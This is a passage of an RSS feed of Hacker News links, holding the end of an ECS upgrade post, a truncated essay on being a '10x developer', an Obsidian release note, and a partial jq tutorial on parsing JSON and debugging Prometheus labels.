data-old-src="https://miro.medium.com/max/60/1*aLUt_mnySqq087XIXLipLg.png?q=20"></p></div></div></div><figcaption>Using a lifecycle hook to gracefully terminate instances</figcaption></figure><p id="08aa"><strong>Challenges along the way</strong></p><p id="8a4e">One of the biggest challenges was the various AWS resources needed (on top of our existing AWS resources) to fully automate the instance upgrades. The complexity of configuring each component in the CloudFormation templates, along with proper IAM roles and permissions was a big task. Wading through the AWS documentation and understanding how to hook up the APIs to communicate with each resource was also a big undertaking. Through a bit of trial and error, we were able to get all pieces working together.</p><p id="4686"><strong>Results</strong></p><p id="b9ef">Since our implementation, we have observed that new Optimized ECS AMIs are generally released about two or three times a month. For us, it is a great feeling each time to see a Slack notification alerting our team of a new AMI quickly followed by a notification of the AMI update to our CloudFormation template. The template update itself occurs within 2 minutes of a newly published AMI. And from there, the rolling upgrade gets initiated in less than 15 minutes, making us very happy campers! On top of that, the additional scheduled monitoring gives us confidence that our container agents are healthy and connected as expected. Needless to say, our efforts were rewarded with a much more resilient system and time saved cumulatively each month!</p></div></div></section></div>]]>
            </description>
            <link>https://eatcodeplay.com/zero-downtime-ecs-cluster-upgrades-da70f3a8a3fd</link>
            <guid isPermaLink="false">hacker-news-small-sites-25499038</guid>
            <pubDate>Mon, 21 Dec 2020 20:15:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Be a 10x Developer]]>
            </title>
            <description>
<![CDATA[
Score 44 | Comments 42 (<a href="https://news.ycombinator.com/item?id=25498696">thread link</a>) | @mooreds
<br/>
December 21, 2020 | https://chelseatroy.com/2020/12/18/how-to-be-a-10x-developer/ | <a href="https://web.archive.org/web/*/https://chelseatroy.com/2020/12/18/how-to-be-a-10x-developer/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p><span><span>Reading Time: </span> <span>13</span> <span>minutes</span></span></p><p>Itâ€™s not a clickbait title, but I understand why it looks that way.</p>



<p>Iâ€™ve made my thoughts about the 10x developer trope <a href="https://chelseatroy.com/2019/12/06/listening-7-deliberate-appreciation/">extremely clear</a>. I think that someone who produces 10x as much code as someone else has left a wake of destruction that will slow down other developers. I donâ€™t think 10x counts if you achieve it by slowing down everyone else. I think 10x has to take into account how you impact other people.</p>



<p>And <em>that,</em> paradoxically, suggests a path for how to become a 10x developer: empower and enable other people such that nine additional developersâ€™ worth of work gets done. You can do that by making nine other developersâ€™ workflows 2x smoother. You can also do that by making 18 other developersâ€™ workflows 50% smoother, or 90 other developersâ€™ workflows 10% smoother.</p>



<div><figure><a href="https://i0.wp.com/chelseatroy.com/wp-content/uploads/2020/12/Screen-Shot-2020-12-18-at-12.53.49-AM.png?ssl=1"><img data-attachment-id="8295" data-permalink="https://chelseatroy.com/2020/12/18/how-to-be-a-10x-developer/screen-shot-2020-12-18-at-12-53-49-am/" data-orig-file="https://i0.wp.com/chelseatroy.com/wp-content/uploads/2020/12/Screen-Shot-2020-12-18-at-12.53.49-AM.png?fit=1200%2C1202&amp;ssl=1" data-orig-size="1200,1202" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Screen Shot 2020-12-18 at 12.53.49 AM" data-image-description="" data-medium-file="https://i0.wp.com/chelseatroy.com/wp-content/uploads/2020/12/Screen-Shot-2020-12-18-at-12.53.49-AM.png?fit=300%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/chelseatroy.com/wp-content/uploads/2020/12/Screen-Shot-2020-12-18-at-12.53.49-AM.png?fit=723%2C724&amp;ssl=1" loading="lazy" src="https://i0.wp.com/chelseatroy.com/wp-content/uploads/2020/12/Screen-Shot-2020-12-18-at-12.53.49-AM.png?resize=310%2C310&amp;ssl=1" alt="owl holding a red leaf in its beak" width="310" height="310" srcset="https://i0.wp.com/chelseatroy.com/wp-content/uploads/2020/12/Screen-Shot-2020-12-18-at-12.53.49-AM.png?w=1200&amp;ssl=1 1200w, https://i0.wp.com/chelseatroy.com/wp-content/uploads/2020/12/Screen-Shot-2020-12-18-at-12.53.49-AM.png?resize=300%2C300&amp;ssl=1 300w, https://i0.wp.com/chelseatroy.com/wp-content/uploads/2020/12/Screen-Shot-2020-12-18-at-12.53.49-AM.png?resize=1022%2C1024&amp;ssl=1 1022w, https://i0.wp.com/chelseatroy.com/wp-content/uploads/2020/12/Screen-Shot-2020-12-18-at-12.53.49-AM.png?resize=150%2C150&amp;ssl=1 150w, https://i0.wp.com/chelseatroy.com/wp-content/uploads/2020/12/Screen-Shot-2020-12-18-at-12.53.49-AM.png?resize=768%2C769&amp;ssl=1 768w, https://i0.wp.com/chelseatroy.com/wp-content/uploads/2020/12/Screen-Shot-2020-12-18-at-12.53.49-AM.png?resize=450%2C450&amp;ssl=1 450w, https://i0.wp.com/chelseatroy.com/wp-content/uploads/2020/12/Screen-Shot-2020-12-18-at-12.53.49-AM.png?resize=60%2C60&amp;ssl=1 60w, https://i0.wp.com/chelseatroy.com/wp-content/uploads/2020/12/Screen-Shot-2020-12-18-at-12.53.49-AM.png?resize=550%2C550&amp;ssl=1 550w" sizes="(max-width: 310px) 100vw, 310px" data-recalc-dims="1"></a><figcaption>PC @templephotobetsy on Instagram</figcaption></figure></div>



<p>At some point, your biggest gains in your X are gonna be in improving the ecosystem for other developers. On occasions when I have succeeded at that, from <a href="https://chelseatroy.com/2018/02/25/how-to-socialize-big-changes-at-work-part-1-start-at-the-grassroots-level/">driving workplace changes</a> to <a href="https://chelseatroy.com/category/teaching/">teaching computer science classes</a>, I have noticed that Iâ€™m using one or more of three techniques. So I thought Iâ€™d list them here.</p>



<h3>First, establish the motivation.</h3>



<p>Learning is work. Sometimes, itâ€™s boring or difficult work. Folks donâ€™t undertake that kind of work unless they understand why they should. Thatâ€™s not as simple as <em>telling</em> them why. Understanding comes from engaging with the material.</p>



<p>Suppose you want to make a major code change that affects your teamâ€™s workflow. If you blaze forward and do that without buy-in, the team will resent it (<a href="https://chelseatroy.com/2018/02/25/how-to-socialize-big-changes-at-work-part-1-start-at-the-grassroots-level/">as weâ€™ve discussed in more detail here</a>). So I recommend starting with individual conversations about the reasons for the change:</p>



<blockquote><p><span>What is bothering you about your teamâ€™s current workflow that motivates you to push your solution? Are you annoyed at having to write the same code over and over in different places? Are you tired of trying to poke your way around an opaque tool? Are you losing track of things that cost you time and money? Before you&nbsp;</span><em>push</em><span>&nbsp;your solution,&nbsp;</span><em>pull</em><span>&nbsp;your coworkers to it by making sure they feel the pain that you feel.</span></p><p>Before I do a major refactor, Iâ€™ll deliberately pair program with key people on my team on the kind of problems that my refactor would solve. I want them to experience the pain firsthand; I want to hear them say â€˜oh my&nbsp;<em>god&nbsp;</em>this is annoying.â€™ After I have that admission of pain from a critical mass of people on my team, Iâ€™ll propose my solution, and Iâ€™ll offer to spearhead the refactor. I will craft a concise explanation of how our workflow changes after the refactor, and Iâ€™ll point out why I think the new way is nicer for us than the way weâ€™re doing it now.&nbsp;&nbsp;I have â€˜negative testimonialsâ€™ about the old way, which I can whip out to capture the attention and agreement of others on my team. This approach allows me to muster support for my refactor and then, in spearheading the refactor, look like Iâ€™m taking one for the team.</p><p>Imagine the same scenario, same refactor, but instead of socializing my solution, I go off on my own, do the refactor, and push. My team didnâ€™t understand the pain that the refactor solved, so all theyâ€™re seeing is the pain of learning the&nbsp;<em>new</em>&nbsp;way to do things. To them, it looks like I made a unilateral decision that screwed them overâ€”the&nbsp;<em>opposite</em>&nbsp;of what a team player would do. Keep in mind, in both circumstances, I wrote the&nbsp;<em>same code</em>. The only difference is how I introduced it.</p></blockquote>



<p>In effect, even the right code changes need to be <em>sold</em>. </p>



<p>How do we know what the right code changes are? This one is tricky, but one guiding principle has helped me out a lot:</p>



<h3>Look for bonehead solutions to convoluted technical issues.</h3>



<p>Michael Feathers talks a great deal about technical simplification options in his various discussions on edge-free programming (<a href="https://chelseatroy.com/2020/05/28/lessons-from-space-edge-free-programming/">hereâ€™s a more detailed look at some of those principles)</a>. But for exemplary purposes, here are a few simple solutions to complex problems that Iâ€™m especially proud of:</p>



<ul><li>I solved a thorny issue with a sometimes camouflaged, sometimes unreliable delete button by ripping it out (<a href="https://github.com/zooniverse/mobile/pull/345">Hereâ€™s the PR if you want more details</a>)</li><li>I resolved the issue of a laggy metronome in React-Native, where computationally expensive operations can result in delays for scheduled tasks. The app happened to also need to play back tracks at various multiples of their original speed. So I recorded a sound file of a metronome at 120 BPM, calculated what speed to play it by dividing the BPM the musician requested by 120, and wrote one method that shelled out to <code>expo-av</code> to play accurate-to-tempo sound files for both the metronome and the backtracks.</li><li>I resolved an issue of regulating how often a person should be allowed to log their mood by realizing the issue was fake (assumed foil to â€œletâ€™s make sure they log it at least this oftenâ€) and letting them log as often as they want (<a href="https://chelseatroy.com/2020/05/28/lessons-from-space-edge-free-programming/">more details here</a>).</li></ul>



<p>Each of these solutions made the code cleaner and eliminated<em> </em>multiple problems with the product. But they were not genius solutions. In fact, they were easy to miss precisely because complex problems donâ€™t scream â€œI have a bonehead solution.â€</p>


	
	


<p><strong>One drawback: </strong>the tech industry generally rewards churning out tons of code <em>over</em> elegant solutions. Chen Lin recently <a href="https://twitter.com/votecapgood/status/1337920511095918592">tweeted about</a> his experience with this at Uber. Chen is responding to <a href="https://twitter.com/mountain_ghosts/status/1337552024821510144">this commentary</a>, which starts out salty but goes on to articulate a rarely-discussed element of how the tech industry functions: tech executives <em>have</em> to make their work appear innovative in order to secure VC funding. So theyâ€™re forced to artificially â€œmake it innovativeâ€ by filing patents or hopping on the latest trends. In the case of Uber and iOS development, that imperative <a href="https://twitter.com/StanTwinB/status/1336890442768547845">burned them badly</a>.</p>



<p>Academia is similar: <a href="https://www.mccormick.northwestern.edu/research-faculty/directory/affiliated/watt-jeremy.html">Dr. Jeremy Watt</a>, author of <em><a href="https://github.com/jermwatt/machine_learning_refined">Machine Learning Refined</a></em>, articulates how academics <em>have</em> to make their work appear novel in order to get published, and they have to get published to keep their jobs, so theyâ€™re forced to artificially differentiate similar conceptsâ€”to convolute rather than simplify.</p>



<p>Thereâ€™s a great <a href="https://twitter.com/mekkaokereke/status/1027552576454021120">explanation from Mekka Okereke</a> about how to counteract some of this as an engineer. It shares a lot with our â€œfirst establish the motivationâ€ approachâ€”namely, by starting from the <em>problem</em>, not the solution.</p>



<p><strong>Also, a giant caveat: </strong>This solution is not always there. Sometimes the solution just has to be clever, or complicated, or messy. Sadly I canâ€™t give you an ironclad heuristic for how to find them or how to confirm their existence. I can tell you this: in most cases where I have found them, I have found them by popping <em>up</em> a level from the implementation level to the design level. </p>



<p>Also, this recommendation applies specifically to technical solutions: it does not apply, for example, to racism or fascism. The problems weâ€™re talking about here are de facto circumscribed by the scope of an application. When weâ€™re talking about a generational cultural, political, and structural phenomenon, â€œjust rip out Xâ€ doesnâ€™t work.</p>


	<div>
		<figure>
							
										<figcaption>Nor does one simply solve [insert insidious social issue here].</figcaption>
					</figure>
	</div>
	


<p>White supremacy culture in tech alone is so insidious and multifaceted that Iâ€™ve got <a href="https://chelseatroy.com/2020/02/07/the-price-of-whiteness-in-tech/">an ongoing series</a> about reimagining different parts of tech through a not-white-supremacist lens. But also, listen to <a href="https://twitter.com/polotek/status/1249908489826099201">Marco Rogers about this caveat</a>. He knows more things than I do.</p>



<p>ANYWAY, anyway, anyway. </p>



<p>So weâ€™ve talked about selling our changes, and weâ€™ve talked about making changes that reduce the scope of complexity. Naturally, the third thing I find myself doing, is selling new knowledge <em>by</em> reducing the scope of complexity. Here we go:</p>



<h3>Try to spread intuition with as few prerequisites as possible.</h3>



<p>One of my Mobile Software Development students asked me what frameworks he should consider for testing a Python app heâ€™s working on. Hereâ€™s what I said:</p>



<blockquote><div><p>In Python there are two leading options: unittest and pytest. Both work fine. When Iâ€™m working on teams, I tend to go with pytest because the output is a little nicer.&nbsp;</p><p>Butâ€¦when Iâ€™m&nbsp;<em>teaching</em>&nbsp;Python, I donâ€™t use a testing framework at all. I write methods that call the method Iâ€™m testing, and then I use Pythonâ€™s&nbsp;<a rel="noreferrer noopener" href="https://www.w3schools.com/python/ref_keyword_assert.asp" target="_blank">built in assert keyword</a>&nbsp;to check the state of the modified objects or return values. Reason being, I donâ€™t want to jump into the complexity of all the different stuff you can use to test until students understand&nbsp;<em>why</em>&nbsp;we test. I try to use the minimum toolset that gets the point across.</p></div></blockquote>



<p><br>One of the big things that educational approaches manage to screw up, in my view, is to introduce prerequisites that make the topic in question <em>harder</em> instead of <em>easier</em>. Fluent Forever founder Gabriel Wyner <a href="https://youtu.be/bPVeIHcgfTs?t=74">articulates how language learning often depends on translation</a>â€”which is a whole, separate, <em>difficult</em> skill. So when Iâ€™m trying to help someone build intuition, Iâ€™ll try to eliminate as many dependencies as possible. </p>



<p>Iâ€™ll show you an example for teaching testing in Python. I pulled this example out of a notebook that I share with my <a href="https://www.emergentworks.org/">Emergent Works</a> and <a href="https://centerforjustice.columbia.edu/justicethroughcode">Justice Through Code</a> mentee. She was working on writing a Sudoku solver. Of course, to solve a Sudoku, it helps to know when a Sudoku is solved. </p>



<p>Suppose we start with a similar but simpler puzzle; each row and each column must each possess one copy of each number, like this:</p>



<pre><code>puzzle = [
    [1, 2, 3, 4],
    [2, 1, 4, 3],
    [3, 4, 1, 2],
    [4, 3, 2, 1],
]</code></pre>



<p>This is a valid puzzle, albeit smaller than your typical 9 x 9. </p>



<p>It shows a way of <em>representing</em> our problem spaceâ€”a list of lists. We could make a <code>Puzzle </code>class for this, with all kinds of methods on it. Iâ€™m not doing that yet. Iâ€™m doing the <em>minimum thing</em> that gets the point across: we need a way to represent our data. Here is a way to represent our data with minimal dependencies and indirection. </p>



<p>Weâ€™re gonna do the same thing for the test, no test framework involved (yet!):</p>



<pre><code>def valid_puzzle(puzzle):
    try: 
        # Python is duck-typed, so â€¦</code></pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://chelseatroy.com/2020/12/18/how-to-be-a-10x-developer/">https://chelseatroy.com/2020/12/18/how-to-be-a-10x-developer/</a></em></p>]]>
            </description>
            <link>https://chelseatroy.com/2020/12/18/how-to-be-a-10x-developer/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25498696</guid>
            <pubDate>Mon, 21 Dec 2020 19:49:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Obsidian Release v0.10.1]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25498416">thread link</a>) | @parsecs
<br/>
December 21, 2020 | https://forum.obsidian.md/t/obsidian-release-v0-10-1/10085 | <a href="https://web.archive.org/web/*/https://forum.obsidian.md/t/obsidian-release-v0-10-1/10085">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          


          <p><span>
              <meta itemprop="datePublished" content="2020-12-16T21:24:26Z">
              <time itemprop="dateModified" datetime="2020-12-21T17:40:29Z">
                December 21, 2020,  5:40pm
              </time>
          <span itemprop="position">#1</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <h2>Shiny new things</h2>
<ul>
<li>Pasting HTML content will now be automatically converted to Markdown. Same for drag and drop. For example, links you drag from web pages will now generate <code>[Display text](https://url)</code> instead of previously just the URL.</li>
</ul>
<h2>Improvements</h2>
<ul>
<li>Creating new notes from the file explorer or using the hotkey now always open in edit mode.</li>
<li>When setting up sync on a vault thatâ€™s older than the synced remote vault, the older files will be ignored and overwritten to avoid a mass rollback.</li>
<li>Navigation history has been slightly tweaked to be more intuitive, and also remembers scroll sync properly.</li>
<li>On macOS, closing the last vault and re-activating Obsidian will now re-open the last vault instead of opening the vault switcher.</li>
</ul>
<h2>No longer broken</h2>
<ul>
<li>On macOS, quitting and restarting the app will properly restore the opened vaults.</li>
<li>Translucency should now work again on app start on macOS.</li>
<li>Drag and drop a file to open in a pane will now properly push the navigation history so going backwards feels more natural.</li>
<li>Spellchecker will now split words that are adjacent to CJK characters.</li>
<li>The â€œexplain search termâ€ button now works properly again.</li>
</ul>
        </div>

        <meta itemprop="headline" content="Obsidian Release v0.10.1">
          <meta itemprop="keywords" content="">

        

         

            
      </div></div>]]>
            </description>
            <link>https://forum.obsidian.md/t/obsidian-release-v0-10-1/10085</link>
            <guid isPermaLink="false">hacker-news-small-sites-25498416</guid>
            <pubDate>Mon, 21 Dec 2020 19:27:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Personal Infrastructure with Inlets, K3s, and Pulumi]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25498394">thread link</a>) | @alexellisuk
<br/>
December 21, 2020 | https://andrewmeier.dev/personal-infrastructure | <a href="https://web.archive.org/web/*/https://andrewmeier.dev/personal-infrastructure">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://andrewmeier.dev/personal-infrastructure</link>
            <guid isPermaLink="false">hacker-news-small-sites-25498394</guid>
            <pubDate>Mon, 21 Dec 2020 19:25:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Parsing JSON at the CLI: A Practical Introduction to jq and more]]>
            </title>
            <description>
<![CDATA[
Score 288 | Comments 98 (<a href="https://news.ycombinator.com/item?id=25498364">thread link</a>) | @sequoia
<br/>
December 21, 2020 | https://sequoia.makes.software/parsing-json-at-the-cli-a-practical-introduction-to-jq-and-more/ | <a href="https://web.archive.org/web/*/https://sequoia.makes.software/parsing-json-at-the-cli-a-practical-introduction-to-jq-and-more/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="content"><p><code>jq</code> is a command line tool for parsing and modifying JSON. It is useful for extracting relevant bits of information from tools that output JSON, or REST APIs that return JSON. Mac users can install <code>jq</code> using homebrew (<code>brew install jq</code>); see <a href="https://stedolan.github.io/jq/download/">here</a> for more install options.</p>
<p>In this post we'll examine a couple "real world" examples of using <code>jq</code>, but let's start with...</p>
<h2 id="-code-jq-code-basics">
    <a href="#-code-jq-code-basics">
      
    </a>
    <code>jq</code> Basics</h2><p>The most basic use is just tidying &amp; pretty-printing your JSON:</p>
<pre><code>$ USERX=<span>'{"name":"duchess","city":"Toronto","orders":[{"id":"x","qty":10},{"id":"y","qty":15}]}'</span>
$ <span>echo</span> <span>$USERX</span> | jq <span>'.'</span>
</code></pre>
<p>outputs</p>
<pre><code>{
  <span>"name"</span>: <span>"duchess"</span>,
  <span>"city"</span>: <span>"Toronto"</span>,
  <span>"orders"</span>: [
    {
      <span>"id"</span>: <span>"x"</span>,
      <span>"qty"</span>: <span>10</span>
    },
    {
      <span>"id"</span>: <span>"y"</span>,
      <span>"qty"</span>: <span>15</span>
    }
  ]
}
</code></pre>
<p>I like this pretty-printing/formatting capability so much, I have an alias that formats JSON I've copied (in my OS "clipboard") &amp; puts it back in my clipboard:</p>
<pre><code><span>alias</span> jsontidy=<span>"pbpaste | jq '.' | pbcopy"</span>
</code></pre>
<p>The <code>'.'</code> in the <code>jq '.'</code> command above is the simplest jq "filter." The dot takes the input JSON and outputs it as is. You can read more about filters <a href="https://stedolan.github.io/jq/manual/#Basicfilters">here</a>, but the bare minimum to know is that <code>.keyname</code> will filter the result to a property matching that key, and <code>[index]</code> will match an array value at that index:</p>
<pre><code>$ <span>echo</span> <span>$USERX</span> | jq <span>'.name'</span>
<span>"duchess"</span>
$ <span>echo</span> <span>$USERX</span> | jq <span>'.orders[0]'</span>
{
  <span>"id"</span>: <span>"x"</span>,
  <span>"qty"</span>: 10
}
</code></pre>
<p>And <code>[]</code> will match <em>each</em> item in an array:</p>
<pre><code><span>echo</span> <span>$USERX</span> | jq <span>'.orders[].id'</span>
<span>"x"</span>
<span>"y"</span>
</code></pre>
<p>Filtering output by value is also handy! Here we use <code>|</code> to output the result of one filter into the input of another filter and <code>select(.qty&gt;10)</code> to select only orders with <code>qty</code> value greater than 10:</p>
<pre><code><span>echo</span> <span>$USERX</span> | jq <span>'.orders[]|select(.qty&gt;10)'</span>
{
  <span>"id"</span>: <span>"y"</span>,
  <span>"qty"</span>: 15
}
</code></pre>
<p>One more trick: filtering by <strong>key</strong> name rather than value:</p>
<pre><code>$ ORDER=<span>'{"user_id":123,"user_name":"duchess","order_id":456,"order_status":"sent","vendor_id":789,"vendor_name":"Abe Books"}'</span>
$ <span>echo</span> <span>$ORDER</span> | jq <span>'.'</span>
{
  <span>"user_id"</span>: 123,
  <span>"user_name"</span>: <span>"duchess"</span>,
  <span>"order_id"</span>: 456,
  <span>"order_status"</span>: <span>"sent"</span>,
  <span>"vendor_id"</span>: 789,
  <span>"vendor_name"</span>: <span>"Abe Books"</span>
}
$ <span>echo</span> <span>$ORDER</span> | jq <span>'with_entries(select(.key|match("order_")))'</span>
{
  <span>"order_id"</span>: 456,
  <span>"order_status"</span>: <span>"sent"</span>
}
</code></pre>
<p>(cheat sheet version: <code>with_entries(select(.key|match("KEY FILTER VALUE")))</code>)</p>
<p>Check out <a href="#more-resources">more resources</a> below to learn about other stuff jq can do!</p>
<h2 id="a-usecase-debugging-some-prometheus-metrics">
    <a href="#a-usecase-debugging-some-prometheus-metrics">
      
    </a>
    A Usecase: Debugging Some Prometheus Metrics</h2><p>I have a prometheus metric showing up locally that doesn't look quite right:</p>
<pre><code>async_task_total{task_name="/Users/duchess/charmoffensive/toodle-app/pkg/web/page/globals.go(189):(*GlobalsPopulator).Populate"} 6
</code></pre>
<p>The fact that the <code>task_name</code> value is a <em>filename</em> is a red flagâ€“<a href="https://prometheus.io/docs/practices/naming/#labels">it's bad to have labels with high cardinality</a> and I'm not sure how many of these there are. I want to find out:</p>
<ol>
<li>What do these <code>task_name</code> labels look like in production?</li>
<li>How many unique values are there for these labels?</li>
</ol>
<h3 id="1-getting-the-label-values-in-production">
    <a href="#1-getting-the-label-values-in-production">
      
    </a>
    1. Getting the label values in production</h3><p>At my company there is a <abbr title="Command Line Interface">CLI</abbr> tool we'll call <code>pquery</code> that allows prometheus metrics to be queried from the command line, and it outputs JSONâ€“how conventient! I use this tool in the following examples. You don't have this tool, but fear not: <a href="https://learndevops.substack.com/p/hitting-prometheus-api-with-curl">this wonderful post</a> explains how to query prometheus using <a href="https://curl.se/">curl</a> which is essentially what <code>pquery</code> does.</p>
<p>Using <code>pquery</code> we can view prometheus metrics from our various clusters. But even if we filter for this exact metric name, it's more data than we can easily look at. We'll use <code>wc -l</code> (wordcount: count lines) to get a rough idea of how much data we're working with:</p>
<pre><code>$ pquery <span>'async_task_total'</span> | wc <span>-l</span>
316117
</code></pre>
<p>316,117 lines of JSON! Oof! We want to iterate over the metrics. But what jq filter do we need to access the array of metrics? I find <code>head</code> useful for figuring out what the top level keys are for a large json structure:</p>
<pre><code>$ pquery <span>'async_task_total'</span> | head -n 20
{
    <span>"data"</span>: {
        <span>"result"</span>: [
            {
                <span>"metric"</span>: {
                    <span>"__name__"</span>: <span>"async_task_total"</span>,
                    <span>"app"</span>: <span>"toodle-app-alpha"</span>,
                    <span>"instance"</span>: <span>"10.55.55.55:9393"</span>,
                    <span>"job"</span>: <span>"toodle-app-alpha"</span>,
                    <span>"kubernetes_pod_name"</span>: <span>"toodle-app-b446b7ccd-6mls6"</span>,
                    <span>"namespace"</span>: <span>"noweb"</span>,
                    <span>"netpol"</span>: <span>"toodle-app"</span>,
                    <span>"node_name"</span>: <span>"gke-production-04-3455c6df-j526"</span>,
                    <span>"release"</span>: <span>"toodle-app"</span>,
                    <span>"task_name"</span>: <span>"/charmoffensive/toodle-app/pkg/core/user/user.go(67):GetAccountDetails"</span>
                },
                <span>"value"</span>: [
                    1600981630.344,
                    <span>"2"</span>
</code></pre>
<p>You can also use <code>jq 'keys'</code> if you just want the key names:</p>
<pre><code>$ pquery <span>'async_task_total'</span> | jq <span>'keys'</span>
[
  <span>"data"</span>,
  <span>"status"</span>
]
</code></pre>
<p>Anyway we can see from above that <code>.data.result</code> is the "filter" path for the metrics themselves. Let's get the <strong>first result</strong> (<code>[0]</code>) of this array so we can see what one metric looks like:</p>
<pre><code>$ pquery <span>'async_task_total'</span> | jq <span>'.data.result[0]'</span>
{
  <span>"metric"</span>: {
    <span>"__name__"</span>: <span>"async_task_total"</span>,
    <span>"app"</span>: <span>"toodle-app-alpha"</span>,
    <span>"instance"</span>: <span>"10.55.55.55:9393"</span>,
    <span>"job"</span>: <span>"toodle-app-alpha"</span>,
    <span>"kubernetes_pod_name"</span>: <span>"toodle-app-b446b7ccd-6mls6"</span>,
    <span>"namespace"</span>: <span>"noweb"</span>,
    <span>"netpol"</span>: <span>"toodle-app"</span>,
    <span>"node_name"</span>: <span>"gke-production-04-3455c6df-j526"</span>,
    <span>"release"</span>: <span>"toodle-app"</span>,
    <span>"task_name"</span>: <span>"/charmoffensive/toodle-app/pkg/core/user/user.go(67):GetAccountDetails"</span>
  },
  <span>"value"</span>: [
    1600981906.069,
    <span>"2"</span>
  ]
}
</code></pre>
<p>Oops! That <code>app</code> value (<code>toodle-app-alpha</code>) indicates a mistake: I'm only interested in results from the <code>toodle-app</code> app, <em>not</em> from other apps that may also emit this metric (such as the <code>alpha</code> deployment we see here). We could <code>select</code> for this using jq, but <a href="https://prometheus.io/docs/prometheus/latest/querying/basics/"><code>promql</code> already lets us filter by metric names</a> so we'll do that instead: <code>pquery 'async_task_total{app="toodle-app"}'</code>.</p>
<p>We're interested in the <code>task_name</code> value in the <code>metric</code> object, so let's pluck that from <strong>each</strong> item in the array above:</p>
<pre><code>$ pquery <span>'async_task_total{app="toodle-app"}'</span> \
| jq <span>'.data.result[].metric.task_name'</span>
<span>"/charmoffensive/toodle-app/pkg/core/guides/guides.go(411):generateGuideFromDefinition"</span>
<span>"/charmoffensive/toodle-app/pkg/core/place/place.go(122):FetchPlaceDetailForCollection"</span>
<span>"/charmoffensive/toodle-app/pkg/core/place/place.go(132):FetchPlaceDetailForCollection"</span>
<span>"/charmoffensive/toodle-app/pkg/core/user/user.go(67):GetAccountDetails"</span>
<span>"/charmoffensive/toodle-app/pkg/core/user/user.go(73):GetAccountDetails"</span>
<span>"/charmoffensive/toodle-app/pkg/web/page/area.go(160):(*areaView).fetchData"</span>
<span>"/charmoffensive/toodle-app/pkg/web/page/area.go(166):(*areaView).fetchData"</span>
<span>"/charmoffensive/toodle-app/pkg/web/page/area.go(172):(*areaView).fetchData"</span>
<span>"/charmoffensive/toodle-app/pkg/web/page/area_category.go(140):(*areaCategoryView).fetchData"</span>
<span>"/charmoffensive/toodle-app/pkg/web/page/area_category.go(146):(*areaCategoryView).fetchData"</span>
{... + 18009 more lines}
</code></pre>
<blockquote>
<p>ğŸ“ Update: It was pointed out to me that as this is a post about <code>jq</code>, not about <code>promql</code>, a <code>jq</code> solution is more appropriate here. I'd originally used promql because it's more efficient to filter on the server when possible. Here's the <code>jq</code> version which uses the <a href="https://stedolan.github.io/jq/manual/#select(boolean_expression)"><code>select</code> filter</a>:</p>
<pre><code>$ pquery <span>'async_task_total'</span> \
| jq <span>'.data.result[].metric | select(.app == "toodle-app").task_name'</span>
</code></pre>
<p>Back to the post...</p>
</blockquote>
<p>Eighteen thousand values for that label!? That's bad!! But wait a ticâ€“if other labels are varying, some of these may actually be duplicates. Let's sort them and see:</p>
<pre><code>$ pquery <span>'async_task_total{app="toodle-app"}'</span> \
| jq <span>'.data.result[].metric.task_name'</span> | sort | head -n10
<span>"/charmoffensive/toodle-app/pkg/core/collection/resolvers/query.go(221):(*queryResolver).Verticals"</span>
<span>"/charmoffensive/toodle-app/pkg/core/collection/resolvers/query.go(221):(*queryResolver).Verticals"</span>
<span>"/charmoffensive/toodle-app/pkg/core/collection/resolvers/query.go(221):(*queryResolver).Verticals"</span>
<span>"/charmoffensive/toodle-app/pkg/core/collection/resolvers/query.go(221):(*queryResolver).Verticals"</span>
<span>"/charmoffensive/toodle-app/pkg/core/collection/resolvers/query.go(221):(*queryResolver).Verticals"</span>
<span>"/charmoffensive/toodle-app/pkg/core/collection/resolvers/query.go(221):(*queryResolver).Verticals"</span>
<span>"/charmoffensive/toodle-app/pkg/core/collection/resolvers/query.go(221):(*queryResolver).Verticals"</span>
<span>"/charmoffensive/toodle-app/pkg/core/guides/guides.go(411):generateGuideFromDefinition"</span>
<span>"/charmoffensive/toodle-app/pkg/core/guides/guides.go(411):generateGuideFromDefinition"</span>
<span>"/charmoffensive/toodle-app/pkg/core/guides/guides.go(411):generateGuideFromDefinition"</span>
</code></pre>
<p>Yep: most of these are actually not unique names. <code>uniq</code> to the rescue!</p>
<pre><code>$  pquery <span>'async_task_total{app="toodle-app"}'</span> \
| jq <span>'.data.result[].metric.task_name'</span> | sort | uniq
<span>"/charmoffensive/toodle-app/pkg/core/collection/resolvers/query.go(221):(*queryResolver).Verticals"</span>
<span>"/charmoffensive/toodle-app/pkg/core/guides/guides.go(411):generateGuideFromDefinition"</span>
<span>"/charmoffensive/toodle-app/pkg/core/place/place.go(122):FetchPlaceDetailForCollection"</span>
<span>"/charmoffensive/toodle-app/pkg/core/place/place.go(132):FetchPlaceDetailForCollection"</span>
<span>"/charmoffensive/toodle-app/pkg/core/user/user.go(67):GetAccountDetails"</span>
<span>"/charmoffensive/toodle-app/pkg/core/user/user.go(73):GetAccountDetails"</span>
